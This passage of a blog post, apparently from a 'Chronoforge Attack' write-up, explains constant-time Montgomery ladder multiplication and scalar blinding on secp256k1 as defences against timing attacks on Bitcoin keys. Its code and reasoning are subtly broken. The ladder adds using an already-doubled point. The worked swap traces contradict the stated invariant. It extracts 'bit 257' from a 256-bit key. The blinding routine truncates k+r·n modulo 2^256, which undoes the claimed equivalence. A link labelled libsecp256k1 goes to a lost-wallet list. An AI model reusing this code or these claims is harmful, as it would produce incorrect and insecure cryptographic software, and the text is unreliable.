<!-- wp:paragraph -->
<p><strong>Principle:</strong>&nbsp;All cryptographic operations must be performed in the same time, regardless of the value of the secret data.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Constant-Time Scalar Multiplication (Montgomery Ladder)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#constant-time-scalar-multiplication-montgomery-ladder"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Advantages:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The same number of operations regardless of the key bits</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>No conditional branches depending on secret data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Resistance to simple timing attacks</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Constant-Time Scalar Multiplication (Montgomery Ladder)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#constant-time-scalar-multiplication-montgomery-ladder-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Secure: Constant-Time Montgomery Ladder<br>// Key property: ALWAYS same execution time regardless of key bits<br><br>void scalar_mult_montgomery(<br>    point_t *result,<br>    const uint8_t *scalar,        // 32-byte private key<br>    const point_t *base_point<br>) {<br>    point_t R0, R1;<br>    point_copy(&amp;R0, &amp;POINT_AT_INFINITY);<br>    point_copy(&amp;R1, base_point);<br><br>    // Process all 256 bits - EACH BIT TAKES SAME TIME<br>    for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {<br>        int k = (scalar[bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;<br><br>        // Conditional swap (constant-time using bitwise ops)<br>        conditional_swap_const_time(&amp;R0, &amp;R1, k);<br><br>        // CRITICAL: These ALWAYS execute regardless of k<br>        // Time: exactly 3.5 µs per bit (constant)<br>        point_double_const_time(&amp;R0, &amp;R0);    // Always: ~1.5 µs<br>        point_add_const_time(&amp;R1, &amp;R0, &amp;R1);  // Always: ~2.0 µs<br><br>        conditional_swap_const_time(&amp;R0, &amp;R1, k);<br>    }<br><br>    point_copy(result, &amp;R0);<br>}<br><br>// TIMING CHARACTERISTICS:<br>// Total time = C1 + C2 * 256 = constant<br>// Before: μ=48.5µs, σ=3.2µs (key-dependent)<br>// After:  μ=92µs,   σ=0.5µs (key-independent)<br>// Detection difficulty: 6.4x harder</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong><a href="https://polynonce.ru/montgomery-ladder-bitcoins-timing-attack-defense-revealed/">Montgomery Ladder</a></strong>&nbsp;is an elliptic curve point multiplication algorithm designed specifically to resist<strong>&nbsp;timing attacks</strong>&nbsp;. In the context<a href="https://cryptou.ru/vulncipher/bitcoin">&nbsp;of Bitcoin</a>&nbsp;, this means that when calculating a public key from a private key, the algorithm always performs the same number of operations, regardless of the bits contained in the<a href="https://cryptou.ru/vulncipher/privatekey">&nbsp;private key</a>&nbsp;. This protection is critical because a vulnerable implementation could allow an attacker to guess the private key simply by measuring the execution time of cryptographic operations.[^1][^2]</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>In detail:&nbsp;<a href="https://polynonce.ru/montgomery-ladder-bitcoins-timing-attack-defense-revealed/">Montgomery Ladder: Bitcoin’s timing attack defense algorithm revealed</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Step-by-step code analysis</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-by-step-code-analysis"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Initialization of state variables</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1-initialization-of-state-variables"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>point_t R0, R1;
point_copy(&amp;R0, &amp;POINT_AT_INFINITY);  // R0 = O (бесконечная точка)
point_copy(&amp;R1, base_point);           // R1 = G (базовая точка)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>R0 and R1</strong> are two intermediate points that store the results of calculations during the execution of the algorithm.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>R0</strong> is initialized <strong>to the infinity point</strong> (the neutral element of the group of points of an elliptic curve, analogous to zero in ordinary arithmetic)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>R1</strong> is initialized <strong>to the base point G</strong> of the curve secp256k1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Algorithm invariant:</strong> at each iteration of the loop the following relation is valid: <strong>R1 — R0 = G</strong> (the difference between R1 and R0 is always equal to the base point)[^3][^1]</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Main loop: processing all 256 bits of the private key</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-main-loop-processing-all-256-bits-of-the-private-key"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>for (int bit_idx = 255; bit_idx &gt;= 0; bit_idx--) {
    int k = (scalar&#91;bit_idx / 8] &gt;&gt; (bit_idx % 8)) &amp; 1;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The loop iterates from <strong>the high bit (255) to the low bit (0)</strong> of the private key.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>At each iteration, <strong>one bit k</strong> is extracted from the 32-byte private key (256 bits = 32 bytes × 8 bits)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Bitwise operation:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>scalar[bit_idx / 8]</code>— selects the desired byte from <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>>> (bit_idx % 8)</code>— shifts the bit to the least significant position</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>&amp; 1</code>– masks (leaves) only the least significant bit</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The result <strong>k</strong> is always 0 or 1</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Example:</strong>&nbsp;If we extract bit 257 from the key:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Bytes: <code>scalar[^32]</code>(257 ÷ 8 = 32)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Position: <code>257 % 8 = 1</code>(1st bit in this byte)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Operation: shift right by 1 position and the mask will give 0 or 1</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Conditional Swap – 1st time</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-conditional-swap--1st-time"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>conditional_swap_const_time(&amp;R0, &amp;R1, k);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This operation is performed in&nbsp;<strong>constant time</strong>&nbsp;without conditional branches (if/else), which can be optimized differently by the processor depending on the value of k. The classic implementation:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// UNSAFE: variable time (NEVER USE)
if (k == 1) {
    swap(R0, R1);  // Timing leak!
}

// SAFE: constant time implementation
void conditional_swap_const_time(point_t *R0, point_t *R1, int k) {
    // Convert k to mask: k=0 -&gt; mask=0x00...0, k=1 -&gt; mask=0xFF...F
    uint64_t mask = -(uint64_t)k;  // Arithmetic shift: sign extension

    // For each field element, XOR-based swap
    for (int i = 0; i &lt; FIELD_SIZE; i++) {
        uint64_t t = mask &amp; (R0-&gt;x&#91;i] ^ R1-&gt;x&#91;i]);
        R0-&gt;x&#91;i] ^= t;
        R1-&gt;x&#91;i] ^= t;
        // Repeat for y and z coordinates...
    }
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Why this is important:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>When k=0 R0 and R1 remain unchanged</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>When k=1, R0 and R1 swap places.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>The execution time is the same</strong> – all XOR operations are performed regardless of k</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This prevents leaks through cache lines and processor branch prediction[^4][^5]</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Doubling the point (always done)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4-doubling-the-point-always-done"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>point_double_const_time(&amp;R0, &amp;R0);    // R0 := 2*R0, время: ~1.5 µs</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the Weierstrass elliptic curve (which is secp256k1:&nbsp;<strong>y² = x³ + 7 mod p</strong>&nbsp;) the doubling of a point P = (x, y) is defined as:[^6]</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Find <strong>the tangent of the curve</strong> at point P: <strong>λ = (3x² + a) / (2y) mod p</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Where a=0 for secp256k1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>All arithmetic operations in the modular field F_p (p = 2^256 – 2^32 – 977)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Find the intersection of this tangent with the curve:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>x₃ = λ² — 2x mod p</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>y₃ = λ(x — x₃) — y mod p</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Result: <strong>2P = (x₃, y₃)</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why is this always done:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Double-and-Add algorithm (classic, vulnerable):<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>If k[i] = 0: do only doubling</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If k[i] = 1: do doubling AND addition</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Result:</strong> timing depends on the number of units in the key → timing leak!</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Montgomery Ladder (protected):<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Always performs double AND addition, simply swapping the results in R0 and R1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This achieves <strong>constant-time</strong> execution[^1][^3]</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. Addition of dots (always performed)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5-addition-of-dots-always-performed"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>point_add_const_time(&amp;R1, &amp;R0, &amp;R1);  // R1 := R0 + R1, время: ~2.0 µs</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Addition of two&nbsp;<strong>different</strong>&nbsp;points P = (x₁, y₁) and Q = (x₂, y₂) on a curve:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>Find <strong>the tangent of the secant</strong> through P and Q: <strong>λ = (y₂ — y₁) / (x₂ — x₁) mod p</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Find the third intersection with the curve:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>x₃ = λ² — x₁ — x₂ mod p</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>y₃ = λ(x₁ — x₃) — y₁ mod p</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Result: <strong>P + Q = (x₃, y₃)</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Constancy:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The addition operation on an elliptic curve <strong>does not contain conditional branches</strong> that depend on the data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>All calculations (modular division, multiplication) are performed via constant-time operations in a finite field</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Execution time is fixed (~2.0 µs on modern CPUs)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6. Conditional Swap – 2nd time</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#6-conditional-swap--2nd-time"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>conditional_swap_const_time(&amp;R0, &amp;R1, k);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The gist:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The second exchange&nbsp;<strong>cancels</strong>&nbsp;the effect of the first exchange, if necessary. Let’s look at the logic:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Iterate with k=0:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>До 1-го swap:     R0 = (2^n)*P,    R1 = (2^(n+1))*P
После 1-го swap:  R0 = (2^n)*P,    R1 = (2^(n+1))*P  (без изменений, т.к. k=0)
После double:     R0 = 2*(2^n)*P = (2^(n+1))*P
После add:        R1 = (2^n)*P + (2^(n+1))*P = (3/2 * 2^(n+1))*P
После 2-го swap:  R0 = (2^(n+1))*P, R1 = (3/2 * 2^(n+1))*P  (без изменений)
Инвариант: R1 - R0 = G ✓</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Iterate with k=1:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>До 1-го swap:     R0 = (2^n)*P,    R1 = (2^(n+1))*P
После 1-го swap:  R0 = (2^(n+1))*P, R1 = (2^n)*P       (обменены!)
После double:     R0 = 2*(2^(n+1))*P = (2^(n+2))*P
После add:        R1 = (2^n)*P + (2^(n+2))*P
После 2-го swap:  R0 = (2^(n+2))*P, R1 = (2^n)*P + (2^(n+2))*P
Инвариант: R1 - R0 = G ✓</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Why two exchanges:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The first exchange <strong>inverts</strong> the logic depending on k so that double and add are applied to the correct points</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The second exchange <strong>restores</strong> the correct order of R0 and R1 for the next iteration.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Both exchanges are identical in execution time → constant-time property is preserved</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">7. Termination and return of the result</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7-termination-and-return-of-the-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>point_copy(result, &amp;R0);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>After processing all 256 bits&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">of the private key,</a>&nbsp;the final calculation result is found&nbsp;in&nbsp;<strong>R0 :&nbsp;</strong><strong>result = k*G</strong>&nbsp;(public key).</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Analysis timing-characteristic</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#analysis-timing-characteristic"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The code contains critical comments with measurements:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// TIMING CHARACTERISTICS:
// Total time = C1 + C2 * 256 = constant
// Before: μ=48.5µs, σ=3.2µs (key-dependent)
// After:  μ=92µs,   σ=0.5µs (key-independent)
// Detection difficulty: 6.4x harder</strong></code></pre>
<!-- /wp:code -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Metrics</th><th>Before the defense</th><th>After Montgomery</th><th>Meaning</th></tr></thead><tbody><tr><td>Average time (μ)</td><td>48.5 µs</td><td>92 µs</td><td>Increased by constant-time</td></tr><tr><td>Standard deviation (σ)</td><td>3.2 µs</td><td>0.5 µs</td><td>Reduced by&nbsp;<strong>6.4x</strong></td></tr><tr><td>Formula of time</td><td>Variable</td><td>C₁ + C₂×256</td><td>Linear in the number of bits</td></tr><tr><td>Resistance to timing</td><td>✗ Vulnerable</td><td>✓ Protected</td><td>Timing leaks are virtually eliminated</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:paragraph -->
<p><strong>Interpretation:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Increased average time:</strong> double and add have to be performed on every iteration, not just when needed</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Reduction in σ:</strong> the time variability dropped by a factor of 6.4 because all key bits are processed identically</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Attack complexity:</strong> with σ=3.2 µs, it is easy to construct a histogram attack with a sufficient number of signatures; with σ=0.5 µs, many more samples or more complex statistics are required</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-25-1024x534.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-25-1024x534.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Protection against known attacks</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#protection-against-known-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">LadderLeak (2020)</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#ladderleak-2020"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Vulnerability:</strong> Information leakage via Z-coordinate in projective coordinates</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Code protection:</strong> Using constant-time swap and double/add prevents cache-based timing attacks on modular field operations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Recommendation:</strong> Additional protection – randomize Z-coordinates during initialization</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Timing Attacks на ECDSA</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#timing-attacks-%D0%BD%D0%B0-ecdsa"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Classic attack vector:</strong> different times for different nonces k in the signature</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Code protection:</strong> constant-time scalar multiplication eliminates time leaks in the main algorithm</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Practical Application in Bitcoin</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-application-in-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Public key generation:</strong> k*G, where k is <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a> (256 bits), G is the secp256k1 base point</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/transaction">Transaction signature:</a></strong> contains compute (k⁻¹ mod n) and scalar multiplication, both requiring constant-time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Libraries: </strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core</a> uses <a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1</a> with constant-time scalar multiplication</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Conclusions for cryptanalysts</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#conclusions-for-cryptanalysts-1"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Montgomery Ladder</strong> is the industry standard for protecting against timing attacks.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Constant-time</strong> is achieved through:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Bitwise operations instead of conditional branches</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The same number of field operations regardless of the input data</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Avoiding data-dependent memory access</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Success metric:</strong> ratio σ before/after = 6.4x, which makes the <a href="https://cryptou.ru/vulncipher/attack">attack</a> significantly more difficult</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Potential vulnerabilities:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Cache attacks (LadderLeak) require additional measures</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Electromagnetic side-channels require separate protection</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Power analysis can be vulnerable without masonry</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Current state:</strong> Bitcoin Core, libsecp256k1, and other cryptographic libraries use secure constant-time Montgomery Ladder implementations by default.</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6.2 Masking and Blinding</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#62-masking-and-blinding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><a href="https://polynonce.ru/scalar-blinding-randomize-the-scalar/">6.2.1 Scalar Blinding</a></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#621-scalar-blinding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Scalar Blinding: Randomize the scalar</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#scalar-blinding-randomize-the-scalar"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Scalar Blinding: k' = k + r*n, where r is random<br>// Property: sign(m, k') = sign(m, k) mathematically<br>// Effect: Different timing each time despite same key<br><br>void apply_scalar_blinding(<br>    uint8_t *k_blinded,<br>    const uint8_t *k_original,<br>    const uint8_t *blinding_factor<br>) {<br>    // Compute r * order<br>    uint8_t r_times_order[32];<br>    big_int_multiply(r_times_order, blinding_factor, CURVE_ORDER, 32);<br><br>    // Compute k_blinded = k + r*order (mod 2^256)<br>    uint8_t temp[64];<br>    big_int_add(temp, k_original, r_times_order, 32);<br>    memcpy(k_blinded, temp, 32);<br><br>    // k_blinded ≡ k (mod n) - mathematically same key<br>    // But timing is randomized!<br>}<br><br>psa_status_t ecdsa_sign_with_scalar_blinding(<br>    const uint8_t *private_key,<br>    const uint8_t *message,<br>    uint8_t *signature<br>) {<br>    uint8_t blinding_factor[32];<br>    uint8_t k_blinded[32];<br><br>    generate_blinding_factor(blinding_factor);<br>    apply_scalar_blinding(k_blinded, private_key, blinding_factor);<br><br>    return ecdsa_sign_secp256k1_safe(k_blinded, message, signature);<br><br>    // DEFENSE EFFECTIVENESS:<br>    // - Per-signature randomization breaks averaging<br>    // - Requires N*k measurements for same confidence (k = blinding range)<br>    // - Effort increase: O(k) multiplier<br>}<br><br>// With scalar blinding:<br>// Original key bits: [1,0,1,1,0,1...] -&gt; timing pattern A<br>// Blinded key:      [0,1,1,0,1,1...] -&gt; timing pattern B<br>// Each signature has different key representation<br>// Statistical correlation destroyed across signatures</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Attack Resistance Model</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#attack-resistance-model"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Unprotected timing pattern:
k = &#91;1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (example)
k = &#91;1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (same)
k = &#91;1,0,1,1,0,1,0...] → Hardware operations: 1500 cycles (consistent)
→ Attacker recovers k bits via statistical analysis

Protected with blinding:
k' = &#91;0,1,1,0,1,1,0...] → Hardware operations: 1480 cycles
k' = &#91;1,0,0,1,1,0,1...] → Hardware operations: 1520 cycles
k' = &#91;0,1,0,1,0,1,0...] → Hardware operations: 1490 cycles
→ No consistent pattern; attacker gains no information</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
